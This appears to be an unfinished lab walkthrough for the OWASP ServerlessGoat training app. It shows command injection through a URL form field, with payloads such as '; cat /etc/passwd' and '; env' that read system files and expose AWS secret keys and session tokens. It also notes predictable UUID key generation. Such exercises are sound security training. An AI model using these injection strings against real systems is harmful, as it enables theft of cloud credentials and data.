#serverless-goat 
## The Verbose Walkthrough

*Still to add **INSTALL/REMOVAL** steps*

### Lambda Function API
1. Locate the Endpoint URL under CloudFormation Outputs
2. Navigate to URL in a separate browser  
The endpoint loads an OWASP ServerlessGoat page containing a form consisting of 
      * a single user input textbox and submit button  
      * a list of potential vulnerabilities  
3. Click Submit with the currrent value in place  
This loads a A Poison Tree poem with a URL that seems remarkably close to an s3 bucket address

### Information Gathering
1. Click back on the browser to return to the page 
2. Attempt **Function Data Injection** by adding code to the end of the URL  
*e.g. try adding*`; pwd`
3. Click submit to load the original poem as well as garbeled information  
  *this appears to be vulnerable to __Function Data Injection__*
#### Improved injection attempts
1. Click back and change the URL form to a URL that doesn't contain a doc file followed by a snippet of code  
e.g. `https://inject; pwd`
2. Click submit to load the current working directory */var/task*
3. Repeat this tasks with the following bash code add for more information  
**Document everything for later**    
`https://inject; whoami`
   *Current user should be sbx-user0666 or similar*   
`https://inject; ls -la`
    *Lists the current directory (index.js + node_modules subdirectory)*   
`https://inject; cat /etc/passwd`
  *Lists current users*  
`https://inject; cat index.js`
    *Provides code for basic information on how this page functions*   
    Important information to be gathered from this file includes
      * Database 
      * S3 bucket Put permissions
      * node.js package used 
      * Table information 
      * Permissions to curl (potentially) 
      * Output URL 
 4. Explore file contents  
 `https://inject; cat node_modules/.bin/uuid`   
 USAGE: `uuid [ver] [options]` + some encryption math used to generate keys  
 this doesn't seem to be entirely random
 5. Read more javascript
  `https://inject; cat node_modules/node-uuid/package.json`  
  *lists package version*  
  Research into this version of UUID results in a known vulnerability to insecure randomness  
  **TL:DR;** math.random can produce predictable values  
  keys generated and used as storage in the s3 bucket may be predicted  
  This could be *very* interesting if it was used to store PII, but it isn't for this circumstance  
 6. Check for unsecured environmental variables  
 `https://inject; env'  
 Results in *very* useful information: 
       * aws_session_token
       * aws_secret_access_key
       * aws_access_key
       * table name
       * s3 bucket name

### Access S3 Bucket via URL

